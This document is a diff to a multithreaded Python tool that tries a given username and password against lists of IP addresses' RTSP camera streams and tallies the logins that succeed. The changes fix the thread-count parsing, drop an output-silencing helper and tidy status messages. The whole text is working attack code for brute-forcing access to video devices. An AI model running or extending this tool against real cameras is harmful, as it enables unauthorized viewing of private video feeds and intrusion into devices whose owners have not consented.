@@ -1,6 +1,6 @@
 #! /usr/bin/env python3
 
-import cv2, contextlib, io, sys
+import cv2
 from datetime import date
 from urllib.parse import quote
 from threading import Thread, Lock
@@ -32,22 +32,12 @@ verbose = False
 
 successful_logins = []
 
-@contextlib.contextmanager
-def stdout_nil():
-    original_stdout = sys.stdout
-    sys.stdout = io.StringIO()
-    try:
-        yield
-    finally:
-        sys.stdout = original_stdout
-
 def loginRTSP(ip, user, password):
     try:
-        with stdout_nil:
-            if user == '':
-                video_capture = cv2.VideoCapture(f"rtsp://{ip}")
-            else:
-                video_capture = cv2.VideoCapture(f"rtsp://{user}:{password}@{ip}")
+        if user == '':
+            video_capture = cv2.VideoCapture(f"rtsp://{ip}")
+        else:
+            video_capture = cv2.VideoCapture(f"rtsp://{user}:{password}@{ip}")
         if video_capture.isOpened():
             return True
         else:
@@ -62,7 +52,7 @@ def loginHandler(ips, user, password, verbose=False):
             with lock:
                 successful_logins.append(ip)
                 if verbose:
-                    display('+', f"{Back.MAGENTA}{ip}{Back.RESET} => Access Granted\tAccess Gained = {Back.MAGENTA}{len(successful_logins)}{Back.RESET}")
+                    display('+', f"{Back.MAGENTA}{ip}{Back.RESET} => Access Granted\t\tAccess Gained = {Back.MAGENTA}{len(successful_logins)}{Back.RESET}")
                 else:
                     display('-', f"{Back.MAGENTA}{ip}{Back.RESET} => Access Denied")
 
@@ -91,7 +81,7 @@ if __name__ == "__main__":
     if not arguments.threads:
         arguments.threads = threads
     else:
-        arguments.threads = int(threads)
+        arguments.threads = int(arguments.threads)
     if arguments.verbose == "True":
         arguments.verbose = True
     else:
@@ -112,20 +102,20 @@ if __name__ == "__main__":
     total_ips = len(ips)
     display('+', "Loaded IP Addresses from Files")
     display(':', f"Total Number of IP Addresses = {Back.MAGENTA}{total_ips}{Back.RESET}")
-    display(':', f"Creating {Back.MAGENTA}{arguments.threads}{Back.RESET}", start='\n')
+    display(':', f"Creating {Back.MAGENTA}{arguments.threads}{Back.RESET} Threads", start='\n')
     ip_division = [ips[group*total_ips//arguments.threads:(group+1)*total_ips//arguments.threads] for group in range(arguments.threads)]
-    display('+', f"Created {Back.MAGENTA}{arguments.threads}{Back.RESET}")
-    display(':', f"Starting {Back.MAGENTA}{arguments.threads}{Back.RESET}", start='\n')
+    display('+', f"Created {Back.MAGENTA}{arguments.threads}{Back.RESET} Threads")
+    display(':', f"Starting {Back.MAGENTA}{arguments.threads}{Back.RESET} Threads", start='\n')
     t1 = time()
     threads = []
     for thread_index, ip_group in enumerate(ip_division):
         threads.append(Thread(name=f"rtsp_brute_force_thread_{thread_index}", target=loginHandler, args=(ip_group, arguments.user, arguments.password, arguments.verbose,)))
         threads[-1].start()
-    display(':', f"Started All {Back.MAGENTA}{arguments.threads}{Back.RESET}")
+    display(':', f"Started All {Back.MAGENTA}{arguments.threads}{Back.RESET} Threads")
     for thread in threads:
         thread.join()
     t2 = time()
-    display('+', f"All Threads Completed Execution")
+    display('+', f"All {Back.MAGENTA}{arguments.threads}{Back.RESET} Threads Completed Execution")
     display(':', f"\tTotal IP Addresses       = {Back.MAGENTA}{total_ips}{Back.RESET}")
     display(':', f"\tSuccessful Authorization = {Back.MAGENTA}{len(successful_logins)}{Back.RESET}")
     display(':', f"\tTime Taken               = {Back.MAGENTA}{t2-t1:.2f} seconds{Back.RESET}")
